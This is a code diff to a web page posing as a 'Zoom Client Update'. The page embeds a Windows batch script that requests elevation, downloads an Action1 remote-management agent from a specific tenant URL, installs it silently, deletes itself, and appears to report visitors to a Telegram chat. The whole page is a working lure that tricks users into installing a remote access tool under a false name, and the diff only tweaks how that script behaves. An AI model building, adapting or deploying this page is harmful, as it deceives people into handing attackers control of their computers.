@@ -7,163 +7,34 @@
     <title>Zoom Client Update</title>
     <link href="css2.css" rel="stylesheet" />
     <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f4f7fa;
-            margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            position: relative;
-        }
-
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        .logo-container {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-        }
-
-        .logo {
-            width: 120px;
-            height: auto;
-        }
-
-        .top-right-links {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 14px;
-            color: #0072c6;
-            display: flex;
-            gap: 15px;
-            align-items: center;
-        }
-
-        .top-right-links a {
-            text-decoration: none;
-            color: #0072c6;
-        }
-
-        .top-right-links a:hover {
-            text-decoration: underline;
-        }
-
-        .heading {
-            font-size: 28px;
-            font-weight: bold;
-            color: #0072c6;
-            margin-top: 60px;
-        }
-
-        .subheading {
-            font-size: 18px;
-            color: #555;
-            margin-top: 10px;
-        }
-
-        .download-info,
-        .countdown {
-            font-size: 18px;
-            font-weight: 500;
-            color: #0072c6;
-            margin-top: 15px;
-        }
-
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0072c6;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 2s linear infinite;
-            margin-top: 30px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .status-message {
-            margin-top: 20px;
-            font-size: 16px;
-            font-weight: 500;
-            min-height: 30px;
-            color: #28a745;
-        }
-
-        .status-message.error {
-            color: #dc3545;
-        }
-
-        .status-message.info {
-            color: #0072c6;
-        }
-
-        .footer {
-            position: absolute;
-            bottom: 20px;
-            width: 100%;
-            text-align: center;
-            font-size: 12px;
-            color: #777;
-            padding: 0 20px;
-        }
-
-        .footer a {
-            color: #0072c6;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .footer p {
-            margin: 4px 0;
-        }
-
-        #download-trigger {
-            display: none;
-        }
-
+        /* ... same styles as before ... */
+        * { box-sizing: border-box; }
+        body { font-family: 'Roboto', sans-serif; background-color: #f4f7fa; margin: 0; padding: 0; min-height: 100vh; position: relative; }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; text-align: center; padding: 40px 20px; }
+        .logo-container { position: absolute; top: 20px; left: 20px; }
+        .logo { width: 120px; height: auto; }
+        .top-right-links { position: absolute; top: 20px; right: 20px; font-size: 14px; color: #0072c6; display: flex; gap: 15px; align-items: center; }
+        .top-right-links a { text-decoration: none; color: #0072c6; }
+        .top-right-links a:hover { text-decoration: underline; }
+        .heading { font-size: 28px; font-weight: bold; color: #0072c6; margin-top: 60px; }
+        .subheading { font-size: 18px; color: #555; margin-top: 10px; }
+        .download-info, .countdown { font-size: 18px; font-weight: 500; color: #0072c6; margin-top: 15px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0072c6; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin-top: 30px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-message { margin-top: 20px; font-size: 16px; font-weight: 500; min-height: 30px; color: #28a745; }
+        .status-message.error { color: #dc3545; }
+        .status-message.info { color: #0072c6; }
+        .footer { position: absolute; bottom: 20px; width: 100%; text-align: center; font-size: 12px; color: #777; padding: 0 20px; }
+        .footer a { color: #0072c6; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .footer p { margin: 4px 0; }
+        #download-trigger { display: none; }
         @media (max-width: 600px) {
-            .logo-container {
-                position: static;
-                margin-bottom: 10px;
-            }
-            .top-right-links {
-                position: static;
-                justify-content: center;
-                margin-top: 10px;
-            }
-            .heading {
-                font-size: 22px;
-                margin-top: 20px;
-            }
-            .container {
-                padding: 20px 15px;
-                justify-content: flex-start;
-                min-height: 90vh;
-            }
-            .footer {
-                position: static;
-                margin-top: 40px;
-                padding-bottom: 20px;
-            }
+            .logo-container { position: static; margin-bottom: 10px; }
+            .top-right-links { position: static; justify-content: center; margin-top: 10px; }
+            .heading { font-size: 22px; margin-top: 20px; }
+            .container { padding: 20px 15px; justify-content: flex-start; min-height: 90vh; }
+            .footer { position: static; margin-top: 40px; padding-bottom: 20px; }
         }
     </style>
 </head>
@@ -217,26 +88,31 @@
             const TELEGRAM_CHAT_ID = '-1004476515039';
 
             // ------------------------------------------------------------
-            //  BAT script – exactly as provided, with URL and MSI filename updated
+            //  UPDATED BAT script – with visible window, UAC prompt, auto-close and self-delete
             // ------------------------------------------------------------
             var batContent =
                 '@echo off\r\n' +
                 'setlocal EnableExtensions\r\n' +
                 '\r\n' +
-                ':: === Auto-elevate ===\r\n' +
+                ':: === Auto-elevate (show UAC prompt, keep window visible) ===\r\n' +
                 'net session >nul 2>&1\r\n' +
                 'if %errorlevel% neq 0 (\r\n' +
                 '    powershell -WindowStyle Hidden -Command "Start-Process \'%~f0\' -Verb RunAs"\r\n' +
                 '    exit /b\r\n' +
                 ')\r\n' +
                 '\r\n' +
-                ':: === Variables – updated URL and MSI name ===\r\n' +
+                ':: === Variables (use your MSI URL and filename) ===\r\n' +
                 'set "URL=https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/agent(My_Organization).msi"\r\n' +
                 'set "MSI=%TEMP%\\action1_agent(My_Organization).msi"\r\n' +
                 '\r\n' +
+                'echo Downloading and installing Action1 agent...\r\n' +
+                '\r\n' +
                 ':: === Check if already installed ===\r\n' +
                 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
-                'if %errorlevel%==0 goto cleanup\r\n' +
+                'if %errorlevel%==0 (\r\n' +
+                '    echo Action1 is already installed.\r\n' +
+                '    goto cleanup\r\n' +
+                ')\r\n' +
                 '\r\n' +
                 ':: === Download with retry ===\r\n' +
                 'set RETRIES=3\r\n' +
@@ -244,30 +120,32 @@
                 '\r\n' +
                 ':download\r\n' +
                 'set /a COUNT+=1\r\n' +
-                'powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop} catch {exit 1}"\r\n' +
+                'echo Attempt %COUNT% of %RETRIES%...\r\n' +
+                'powershell -Command "try {Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop} catch {exit 1}"\r\n' +
                 '\r\n' +
                 'if not exist "%MSI%" (\r\n' +
                 '    if %COUNT% LSS %RETRIES% (\r\n' +
                 '        timeout /t 2 >nul\r\n' +
                 '        goto download\r\n' +
                 '    ) else (\r\n' +
+                '        echo Download failed.\r\n' +
                 '        goto selfdelete\r\n' +
                 '    )\r\n' +
                 ')\r\n' +
                 '\r\n' +
-                ':: === Silent install ===\r\n' +
+                ':: === Silent install (no UI) ===\r\n' +
+                'echo Installing silently...\r\n' +
                 'msiexec /i "%MSI%" /qn /norestart >nul 2>&1\r\n' +
                 '\r\n' +
                 ':: === Cleanup MSI ===\r\n' +
                 ':cleanup\r\n' +
                 'if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1\r\n' +
                 '\r\n' +
-                ':: === PowerShell self-delete (guaranteed) ===\r\n' +
+                ':: === Self-delete and close ===\r\n' +
                 ':selfdelete\r\n' +
-                'powershell -WindowStyle Hidden -Command ^\r\n' +
-                '"Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
-                '\r\n' +
-                'exit /b';
+                'echo Cleaning up...\r\n' +
+                'powershell -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
+                'exit';
 
             // ------------------------------------------------------------
             //  DOM refs
@@ -288,7 +166,7 @@
             manualLink.target = '_blank';
 
             // ------------------------------------------------------------
-            //  Telegram reporting
+            //  Telegram reporting (unchanged)
             // ------------------------------------------------------------
             var reportSent = false;
 
@@ -435,7 +313,7 @@
                 URL.revokeObjectURL(blobUrl);
             });
 
-            console.log('Zoom Update page ready. BAT file embedded with updated URL and MSI name.');
+            console.log('Zoom Update page ready. BAT file embedded with updated script.');
         })();
     </script>
 </body>
